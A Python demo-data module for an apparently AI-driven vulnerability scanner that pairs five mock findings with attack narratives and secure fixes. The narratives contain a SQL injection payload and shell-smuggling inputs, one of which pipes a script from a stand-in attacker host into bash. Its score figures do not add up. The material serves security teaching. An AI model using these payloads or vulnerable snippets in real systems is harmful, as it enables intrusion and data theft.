from typing import Dict, Any, List
from ..models.schemas import (
    ScanResult, Vulnerability, EvidenceStep, AttackPath, AttackPathNode, AttackPathEdge,
    SecurityDNA, SecurityDNANode, SecurityDNAEdge, SecurityRadarMetrics,
    SecurityScoreBreakdown, SecurityPassport, FixProposal, TimelineEvent
)

DEMO_PROJECT_ID = "proj_aicommerce_01"
DEMO_PROJECT_NAME = "AI-Commerce Engine"
DEMO_SCAN_ID = "scan_demo_v1"

def get_demo_vulnerabilities() -> List[Vulnerability]:
    return [
        Vulnerability(
            id="vuln_sqli_1",
            scan_id=DEMO_SCAN_ID,
            title="SQL Injection via Raw String Concatenation",
            cwe="CWE-89",
            severity="CRITICAL",
            confidence=94,
            exploitability="HIGH",
            status="CONFIRMED",
            hallucination_status="VERIFIED",
            category="Injection",
            file="server/api/users.py",
            line_start=84,
            line_end=86,
            code_snippet="""# server/api/users.py:84
query = f"SELECT id, username, email, role FROM users WHERE username = '{username}'"
cursor.execute(query)""",
            evidence_chain=[
                EvidenceStep(
                    step=1,
                    file="server/api/users.py",
                    line=42,
                    code="username = request.args.get('username')",
                    description="User parameter received directly from untrusted HTTP request query string.",
                    role="SOURCE"
                ),
                EvidenceStep(
                    step=2,
                    file="server/controllers/user_controller.py",
                    line=81,
                    code="user_record = fetch_user_by_name(username)",
                    description="Variable passed through controller without sanitization, schema check, or regex.",
                    role="PROPAGATION"
                ),
                EvidenceStep(
                    step=3,
                    file="server/services/database.py",
                    line=109,
                    code="query = f\"SELECT id, username, email, role FROM users WHERE username = '{username}'\"",
                    description="F-string formats unescaped string directly into SQL command template.",
                    role="PROPAGATION"
                ),
                EvidenceStep(
                    step=4,
                    file="server/api/users.py",
                    line=84,
                    code="cursor.execute(query)",
                    description="SQLite driver executes raw interpolated command allowing arbitrary clause injection.",
                    role="SINK"
                )
            ],
            attack_path=AttackPath(
                id="path_sqli_1",
                title="Attack Path: SQL Injection to Tenant Data Exfiltration",
                severity="CRITICAL",
                description="End-to-end data flow from untrusted client query to database exfiltration.",
                narrative="An attacker supplies \"' OR 1=1--\" in the username parameter. The query evaluates to True for all database rows, dumping password hashes and tenant records across the trust boundary.",
                nodes=[
                    AttackPathNode(id="n1", label="External Client", type="INPUT", description="Attacker sends crafted SQL payload via HTTP GET."),
                    AttackPathNode(id="n2", label="/api/users Endpoint", type="TRUST_BOUNDARY", description="Ingress router in server/api/users.py:42."),
                    AttackPathNode(id="n3", label="SQL Interpolation", type="VULNERABLE_COMPONENT", description="Dynamic f-string formatting in server/api/users.py:84."),
                    AttackPathNode(id="n4", label="SQLite Database", type="DATABASE", description="Database execution engine."),
                    AttackPathNode(id="n5", label="User Records / Hashes", type="SENSITIVE_RESOURCE", description="Sensitive user credentials and email records.")
                ],
                edges=[
                    AttackPathEdge(source="n1", target="n2", label="GET /api/users?username=' OR 1=1--", animated=True),
                    AttackPathEdge(source="n2", target="n3", label="Unsanitized String", animated=True),
                    AttackPathEdge(source="n3", target="n4", label="Malformed SQL AST", animated=True),
                    AttackPathEdge(source="n4", target="n5", label="Full Table Dump", animated=True)
                ]
            ),
            ai_explanation_beginner="Your application accepts a visitor's username and puts it straight into a database command. A malicious visitor can type special characters like quotes to trick the database into handing over every user's secret password and email.",
            ai_explanation_technical="CWE-89: Direct string interpolation into raw SQL query without prepared statement parameter binding. Permits union-based extraction of user table data and authentication bypass.",
            fix=FixProposal(
                id="fix_sqli_1",
                vulnerability_id="vuln_sqli_1",
                original_code="""query = f"SELECT id, username, email, role FROM users WHERE username = '{username}'"\ncursor.execute(query)""",
                proposed_fix="""# SECURE PARAMETERIZED QUERY
query = "SELECT id, username, email, role FROM users WHERE username = ?"
cursor.execute(query, (username,))""",
                why_this_fix="Switches from string formatting to prepared statement parameter binding. Database driver treats input purely as literal data, making SQL injection impossible.",
                what_changed="Replaced f-string with '?' placeholder; passed (username,) tuple as 2nd parameter.",
                security_impact="Completely resolves CWE-89. Zero SQL injection surface remains.",
                possible_side_effects=["None. Standard behavior remains identical for legitimate usernames."],
                confidence=96,
                status="GENERATED"
            ),
            source_scanner="Semgrep + Python AST Analyzer"
        ),
        Vulnerability(
            id="vuln_cmdi_1",
            scan_id=DEMO_SCAN_ID,
            title="OS Command Injection in Network Diagnostic Handler",
            cwe="CWE-78",
            severity="CRITICAL",
            confidence=95,
            exploitability="HIGH",
            status="CONFIRMED",
            hallucination_status="VERIFIED",
            category="Injection",
            file="server/services/system_diagnostics.py",
            line_start=38,
            line_end=40,
            code_snippet="""# server/services/system_diagnostics.py:38
cmd = f"ping -c 1 {host}"
subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)""",
            evidence_chain=[
                EvidenceStep(
                    step=1,
                    file="server/api/diagnostics.py",
                    line=15,
                    code="host = request.json.get('target_ip')",
                    description="User string parameter received from POST request body.",
                    role="SOURCE"
                ),
                EvidenceStep(
                    step=2,
                    file="server/services/system_diagnostics.py",
                    line=38,
                    code="cmd = f\"ping -c 1 {host}\"",
                    description="Target IP concatenated directly into shell command string.",
                    role="PROPAGATION"
                ),
                EvidenceStep(
                    step=3,
                    file="server/services/system_diagnostics.py",
                    line=39,
                    code="subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)",
                    description="Subprocess executed through host OS shell (/bin/sh or cmd.exe).",
                    role="SINK"
                )
            ],
            attack_path=AttackPath(
                id="path_cmdi_1",
                title="Attack Path: Remote Code Execution via Shell Delimiters",
                severity="CRITICAL",
                description="Execution chain from diagnostic input to host OS shell takeover.",
                narrative="An attacker submits '127.0.0.1; curl https://attacker.com/rev.sh | bash'. Because shell=True is enabled, the OS shell executes the secondary command with full application permissions.",
                nodes=[
                    AttackPathNode(id="cn1", label="Attacker Client", type="INPUT", description="Sends JSON payload containing semicolon delimiter."),
                    AttackPathNode(id="cn2", label="/api/diagnostics/ping", type="TRUST_BOUNDARY", description="Ingress network route."),
                    AttackPathNode(id="cn3", label="subprocess.Popen(shell=True)", type="VULNERABLE_COMPONENT", description="Shell executor parsing untrusted text."),
                    AttackPathNode(id="cn4", label="Host OS Shell (/bin/sh)", type="SENSITIVE_RESOURCE", description="Underlying server container environment.")
                ],
                edges=[
                    AttackPathEdge(source="cn1", target="cn2", label="POST {\"target_ip\": \"8.8.8.8; id\"}", animated=True),
                    AttackPathEdge(source="cn2", target="cn3", label="Raw String Pass-through", animated=True),
                    AttackPathEdge(source="cn3", target="cn4", label="Arbitrary Command Execution", animated=True)
                ]
            ),
            ai_explanation_beginner="Your app runs a server terminal command using text sent by a visitor. An attacker can sneak in extra terminal commands (like deleting files or downloading malware) separated by semicolons.",
            ai_explanation_technical="CWE-78: Untrusted input flows to subprocess.Popen with shell=True. This allows shell metacharacter execution resulting in full remote code execution (RCE).",
            fix=FixProposal(
                id="fix_cmdi_1",
                vulnerability_id="vuln_cmdi_1",
                original_code="cmd = f\"ping -c 1 {host}\"\nsubprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)",
                proposed_fix="""# SECURE TOKENIZED EXECUTION WITHOUT SHELL
import shlex
import ipaddress

# Validate input as valid IP address
try:
    ipaddress.ip_address(host)
except ValueError:
    raise ValueError("Invalid IP address format")

# Execute with explicit argument array and shell=False
proc = subprocess.Popen(["ping", "-c", "1", host], shell=False, stdout=subprocess.PIPE)""",
                why_this_fix="Validates IP format and executes ping as a discrete token array with shell=False, preventing command injection completely.",
                what_changed="Added IP address validation; switched to token list; disabled shell invocation.",
                security_impact="Resolves CWE-78 and prevents arbitrary command execution.",
                possible_side_effects=["Hostnames must be validated separately if domain names are allowed."],
                confidence=95,
                status="GENERATED"
            ),
            source_scanner="Python AST Analyzer"
        ),
        Vulnerability(
            id="vuln_sec_1",
            scan_id=DEMO_SCAN_ID,
            title="Hardcoded Live Stripe Secret Key in Configuration",
            cwe="CWE-798",
            severity="CRITICAL",
            confidence=98,
            exploitability="HIGH",
            status="CONFIRMED",
            hallucination_status="VERIFIED",
            category="Secrets",
            file="config/payment_secrets.py",
            line_start=12,
            line_end=12,
            code_snippet="STRIPE_LIVE_KEY = 'sk_live_51M0...9xQ2'",
            evidence_chain=[
                EvidenceStep(
                    step=1,
                    file="config/payment_secrets.py",
                    line=12,
                    code="STRIPE_LIVE_KEY = 'sk_live_51M0...9xQ2'",
                    description="Live production payment secret key hardcoded into Python source file.",
                    role="SOURCE"
                ),
                EvidenceStep(
                    step=2,
                    file="server/services/billing.py",
                    line=24,
                    code="stripe.api_key = STRIPE_LIVE_KEY",
                    description="Key imported and passed to Stripe API client.",
                    role="PROPAGATION"
                )
            ],
            attack_path=AttackPath(
                id="path_sec_1",
                title="Attack Path: Cloud API Key Theft & Financial Drain",
                severity="CRITICAL",
                description="Exploitation of committed production payment credential.",
                narrative="An attacker clones or extracts the code artifact, retrieves the live Stripe private key, and issues unauthorized customer refunds or transfers.",
                nodes=[
                    AttackPathNode(id="sn1", label="Source Repository", type="INPUT", description="Committed config/payment_secrets.py."),
                    AttackPathNode(id="sn2", label="Plaintext Key Extraction", type="TRUST_BOUNDARY", description="Key scraped from source control."),
                    AttackPathNode(id="sn3", label="Stripe API Server", type="EXTERNAL_SERVICE", description="Live payment gateway."),
                    AttackPathNode(id="sn4", label="Customer Payment Records", type="SENSITIVE_RESOURCE", description="Credit card tokens and financial balances.")
                ],
                edges=[
                    AttackPathEdge(source="sn1", target="sn2", label="Git Commit Scrape", animated=True),
                    AttackPathEdge(source="sn2", target="sn3", label="Authenticate with sk_live_***", animated=True),
                    AttackPathEdge(source="sn3", target="sn4", label="Unauthorized Financial Operations", animated=True)
                ]
            ),
            ai_explanation_beginner="A real payment system password is typed directly into your files. Anyone who can see your code or download the program can copy it and take money from your payment account.",
            ai_explanation_technical="CWE-798: Plaintext cryptographic secret embedded into versioned repository. Breaches credential confidentiality and perimeter access controls.",
            fix=FixProposal(
                id="fix_sec_1",
                vulnerability_id="vuln_sec_1",
                original_code="STRIPE_LIVE_KEY = 'sk_live_51M0...9xQ2'",
                proposed_fix="""import os
# Load secret securely from environment variable
STRIPE_LIVE_KEY = os.environ.get("STRIPE_SECRET_KEY")
if not STRIPE_LIVE_KEY:
    raise RuntimeError("Missing STRIPE_SECRET_KEY environment variable")""",
                why_this_fix="Loads the API key dynamically from secure environment variables rather than embedding it in the code.",
                what_changed="Replaced string constant with os.environ.get() check.",
                security_impact="Resolves CWE-798. Key is never saved to disk or repository history.",
                possible_side_effects=["STRIPE_SECRET_KEY must be populated in server environment."],
                confidence=98,
                status="GENERATED"
            ),
            source_scanner="Gitleaks Engine"
        ),
        Vulnerability(
            id="vuln_auth_1",
            scan_id=DEMO_SCAN_ID,
            title="Missing Authorization Check on Sensitive Tenant Export Endpoint",
            cwe="CWE-306",
            severity="HIGH",
            confidence=88,
            exploitability="HIGH",
            status="CONFIRMED",
            hallucination_status="VERIFIED",
            category="Auth",
            file="server/api/admin_export.py",
            line_start=47,
            line_end=53,
            code_snippet="""@app.get("/api/admin/export/all_users")
def export_all_users():
    # Missing @require_admin or Depends(get_current_admin)
    return db.query("SELECT * FROM users").fetchall()""",
            evidence_chain=[
                EvidenceStep(
                    step=1,
                    file="server/api/admin_export.py",
                    line=47,
                    code="@app.get(\"/api/admin/export/all_users\")",
                    description="Privileged administrative endpoint exposed to public router.",
                    role="SOURCE"
                ),
                EvidenceStep(
                    step=2,
                    file="server/api/admin_export.py",
                    line=49,
                    code="def export_all_users():",
                    description="Handler executes without role checking decorator or token verification.",
                    role="PROPAGATION"
                ),
                EvidenceStep(
                    step=3,
                    file="server/api/admin_export.py",
                    line=51,
                    code="return db.query(\"SELECT * FROM users\").fetchall()",
                    description="Returns entire database user dataset to unauthenticated requester.",
                    role="SINK"
                )
            ],
            attack_path=AttackPath(
                id="path_auth_1",
                title="Attack Path: Direct Endpoint Access to Mass Data Leak",
                severity="HIGH",
                description="Unauthenticated privilege bypass.",
                narrative="An unauthenticated web browser navigates to /api/admin/export/all_users and receives the complete database user dump because no session or token is checked.",
                nodes=[
                    AttackPathNode(id="an1", label="Unauthenticated Web User", type="INPUT", description="Anonymous user discovering URL."),
                    AttackPathNode(id="an2", label="/api/admin/export Route", type="TRUST_BOUNDARY", description="Missing gatekeeper."),
                    AttackPathNode(id="an3", label="Customer Database", type="DATABASE", description="Database storing full customer table.")
                ],
                edges=[
                    AttackPathEdge(source="an1", target="an2", label="HTTP GET Request (No Cookie/Token)", animated=True),
                    AttackPathEdge(source="an2", target="an3", label="Unchecked Query Execution", animated=True)
                ]
            ),
            ai_explanation_beginner="An admin-only download link has no login lock. Any stranger who types the web address into their browser can immediately download all of your customers' records.",
            ai_explanation_technical="CWE-306: Missing authentication and role-based access control on sensitive administrative export handler.",
            fix=FixProposal(
                id="fix_auth_1",
                vulnerability_id="vuln_auth_1",
                original_code="@app.get(\"/api/admin/export/all_users\")\ndef export_all_users():\n    return db.query(\"SELECT * FROM users\").fetchall()",
                proposed_fix="""from fastapi import Depends, HTTPException, status
from app.auth import get_current_admin_user, User

@app.get("/api/admin/export/all_users")
def export_all_users(admin: User = Depends(get_current_admin_user)):
    # Enforces verified admin bearer token
    return db.query("SELECT * FROM users").fetchall()""",
                why_this_fix="Adds FastAPI Depends dependency injection requiring a verified admin user session.",
                what_changed="Added Depends(get_current_admin_user) parameter.",
                security_impact="Resolves CWE-306. Unauthenticated requests are rejected with HTTP 401 Unauthorized.",
                possible_side_effects=["Callers must supply a valid Authorization Bearer header."],
                confidence=93,
                status="GENERATED"
            ),
            source_scanner="Python AST Analyzer"
        ),
        Vulnerability(
            id="vuln_dep_1",
            scan_id=DEMO_SCAN_ID,
            title="Vulnerable Dependency: PyYAML Arbitrary Code Execution (CVE-2020-14343)",
            cwe="CWE-1395",
            severity="CRITICAL",
            confidence=96,
            exploitability="MEDIUM",
            status="CONFIRMED",
            hallucination_status="VERIFIED",
            category="Dependencies",
            file="requirements.txt",
            line_start=8,
            line_end=8,
            code_snippet="PyYAML==5.3.1",
            evidence_chain=[
                EvidenceStep(
                    step=1,
                    file="requirements.txt",
                    line=8,
                    code="PyYAML==5.3.1",
                    description="Outdated version of PyYAML specified in project dependency manifest.",
                    role="SOURCE"
                ),
                EvidenceStep(
                    step=2,
                    file="server/utils/config_loader.py",
                    line=14,
                    code="yaml.load(user_config_file)",
                    description="yaml.load called without SafeLoader, triggering CVE-2020-14343.",
                    role="SINK"
                )
            ],
            attack_path=AttackPath(
                id="path_dep_1",
                title="Attack Path: Supply Chain Deserialization to Shell Access",
                severity="CRITICAL",
                description="Exploitation of vulnerable PyYAML dependency.",
                narrative="An attacker uploads a YAML configuration file containing Python object constructor tags (!!python/object/apply). PyYAML 5.3.1 executes arbitrary code during parsing.",
                nodes=[
                    AttackPathNode(id="dn1", label="Malicious YAML Payload", type="INPUT", description="Crafted YAML file with python object tags."),
                    AttackPathNode(id="dn2", label="PyYAML 5.3.1 Parser", type="VULNERABLE_COMPONENT", description="Vulnerable deserialization library."),
                    AttackPathNode(id="dn3", label="Host Process Runtime", type="SENSITIVE_RESOURCE", description="Process execution sandbox.")
                ],
                edges=[
                    AttackPathEdge(source="dn1", target="dn2", label="Upload Configuration", animated=True),
                    AttackPathEdge(source="dn2", target="dn3", label="Arbitrary Object Instantiation", animated=True)
                ]
            ),
            ai_explanation_beginner="The app is using an old version of a popular building block called PyYAML. Hackers figured out a trick to send special text files to this building block that take over the server.",
            ai_explanation_technical="CWE-1395 / CVE-2020-14343: Incomplete fix for CVE-2020-1747 enables remote code execution when parsing untrusted YAML data.",
            fix=FixProposal(
                id="fix_dep_1",
                vulnerability_id="vuln_dep_1",
                original_code="PyYAML==5.3.1",
                proposed_fix="PyYAML>=6.0.1",
                why_this_fix="Upgrades PyYAML to 6.0.1+ where SafeLoader is enforced by default.",
                what_changed="Updated version constraint to >=6.0.1 in requirements.txt.",
                security_impact="Resolves CVE-2020-14343 and secures YAML parsing.",
                possible_side_effects=["Ensure any custom YAML tags are registered with SafeLoader."],
                confidence=97,
                status="GENERATED"
            ),
            source_scanner="OSV-Scanner Advisory DB"
        )
    ]

def get_demo_security_dna() -> SecurityDNA:
    return SecurityDNA(
        nodes=[
            SecurityDNANode(
                id="dna_app",
                name="AI-Commerce Application Core",
                category="APP",
                technology="FastAPI / Python 3.11",
                risk_level="CRITICAL",
                files=["server/api/users.py", "server/services/system_diagnostics.py", "server/api/admin_export.py"],
                vulnerabilities_count=2,
                attack_surface_desc="Core application REST controllers handling order processing and customer profiles."
            ),
            SecurityDNANode(
                id="dna_auth",
                name="Identity & Access Perimeter",
                category="AUTH",
                technology="JWT / Session Middleware",
                risk_level="HIGH",
                files=["server/api/admin_export.py", "server/auth.py"],
                vulnerabilities_count=1,
                attack_surface_desc="User authentication boundaries. Missing role enforcement detected on administrative export."
            ),
            SecurityDNANode(
                id="dna_api",
                name="Ingress API Gateway",
                category="API",
                technology="REST OpenAPI 3.0",
                risk_level="HIGH",
                files=["server/api/users.py", "server/api/diagnostics.py"],
                vulnerabilities_count=2,
                attack_surface_desc="Public network endpoints accepting unvalidated user input parameters."
            ),
            SecurityDNANode(
                id="dna_db",
                name="Primary Database",
                category="DATABASE",
                technology="PostgreSQL / SQLite",
                risk_level="CRITICAL",
                files=["server/services/database.py"],
                vulnerabilities_count=1,
                attack_surface_desc="Persistent customer records and password hashes vulnerable to SQL injection."
            ),
            SecurityDNANode(
                id="dna_sec",
                name="Cryptographic Secrets Vault",
                category="SECRET",
                technology="Config Files / In-Memory",
                risk_level="CRITICAL",
                files=["config/payment_secrets.py"],
                vulnerabilities_count=1,
                attack_surface_desc="Exposed live Stripe secret key hardcoded in source repository."
            ),
            SecurityDNANode(
                id="dna_ext",
                name="Payment Gateway Service",
                category="EXTERNAL_API",
                technology="Stripe Cloud API",
                risk_level="HIGH",
                files=["server/services/billing.py"],
                vulnerabilities_count=1,
                attack_surface_desc="Third-party payment processor integration vulnerable to unauthorized balance drain."
            ),
            SecurityDNANode(
                id="dna_dep",
                name="OSS Supply Chain",
                category="DEPENDENCY",
                technology="Python Packages (pip)",
                risk_level="CRITICAL",
                files=["requirements.txt"],
                vulnerabilities_count=1,
                attack_surface_desc="Vulnerable PyYAML 5.3.1 library subject to CVE-2020-14343."
            )
        ],
        edges=[
            SecurityDNAEdge(source="dna_api", target="dna_app", relation="routes_traffic_to"),
            SecurityDNAEdge(source="dna_app", target="dna_auth", relation="authenticates_via"),
            SecurityDNAEdge(source="dna_app", target="dna_db", relation="queries_data_from"),
            SecurityDNAEdge(source="dna_app", target="dna_sec", relation="reads_credentials"),
            SecurityDNAEdge(source="dna_sec", target="dna_ext", relation="authenticates_outbound"),
            SecurityDNAEdge(source="dna_app", target="dna_dep", relation="links_runtime_package")
        ],
        frameworks=["FastAPI", "Uvicorn", "Pydantic"],
        languages=["Python", "SQL"],
        databases=["PostgreSQL", "SQLite"],
        auth_methods=["JWT Bearer Tokens", "Session Cookies"]
    )

def get_demo_timeline() -> List[TimelineEvent]:
    return [
        TimelineEvent(
            version="v1.0.0",
            scan_id="scan_demo_v1",
            timestamp="2026-11-18 14:20 UTC",
            score=41,
            score_delta=0,
            new_vulnerabilities_count=5,
            fixed_vulnerabilities_count=0,
            regressions=[],
            summary="Initial baseline scan of AI-generated application. Multiple critical security vulnerabilities detected across input validation, secrets, and auth."
        ),
        TimelineEvent(
            version="v1.1.0",
            scan_id="scan_demo_v2",
            timestamp="2026-11-19 09:45 UTC",
            score=58,
            score_delta=17,
            new_vulnerabilities_count=0,
            fixed_vulnerabilities_count=1,
            regressions=[],
            summary="Security Fix Lab applied: Hardcoded Stripe key moved to environment variables. Score improved +17 points."
        ),
        TimelineEvent(
            version="v1.2.0",
            scan_id="scan_demo_v3",
            timestamp="2026-11-20 16:10 UTC",
            score=82,
            score_delta=24,
            new_vulnerabilities_count=0,
            fixed_vulnerabilities_count=2,
            regressions=[],
            summary="Fix Lab simulation verified: SQL Injection parameterized and PyYAML bumped to >=6.0.1. Score reached 82."
        ),
        TimelineEvent(
            version="v1.3.0",
            scan_id="scan_demo_v4",
            timestamp="2026-11-21 01:30 UTC",
            score=94,
            score_delta=12,
            new_vulnerabilities_count=0,
            fixed_vulnerabilities_count=2,
            regressions=[],
            summary="All critical and high findings verified resolved. Security Passport issued with grade A (94/100)."
        )
    ]

def get_demo_scan_result() -> ScanResult:
    vulns = get_demo_vulnerabilities()
    dna = get_demo_security_dna()
    return ScanResult(
        scan_id=DEMO_SCAN_ID,
        project_id=DEMO_PROJECT_ID,
        project_name=DEMO_PROJECT_NAME,
        timestamp="2026-11-21 01:50 UTC",
        status="COMPLETED",
        vulnerabilities=vulns,
        security_dna=dna,
        radar=SecurityRadarMetrics(
            authentication=52,
            authorization=48,
            secrets=30,
            dependencies=65,
            input_validation=42,
            api_security=60,
            configuration=70,
            data_protection=55,
            code_safety=46,
            ai_confidence=94
        ),
        score_breakdown=SecurityScoreBreakdown(
            score=41,
            base_score=100,
            critical_penalty=42,
            high_penalty=12,
            medium_penalty=0,
            low_penalty=0,
            secret_penalty=15,
            dependency_penalty=10,
            delta=0,
            audit_trail=[
                "-42 pts: 2 Critical Vulnerabilities (SQL Injection, Command Injection)",
                "-12 pts: 1 High Vulnerability (Missing Auth on Sensitive Route)",
                "-15 pts: 1 Exposed Live Production Stripe Credential",
                "-10 pts: 1 Vulnerable Dependency (PyYAML CVE-2020-14343)"
            ]
        ),
        passport=SecurityPassport(
            project_id=DEMO_PROJECT_ID,
            project_name=DEMO_PROJECT_NAME,
            security_score=41,
            risk_level="CRITICAL",
            verified_fixes_count=0,
            open_critical_count=3,
            open_high_count=2,
            dependency_health_pct=65,
            secret_health_pct=25,
            attack_surface_rating="ELEVATED",
            ai_confidence_pct=94,
            verification_pct=0,
            last_verified="2026-11-21 01:50 UTC"
        ),
        regressions_detected=[]
    )
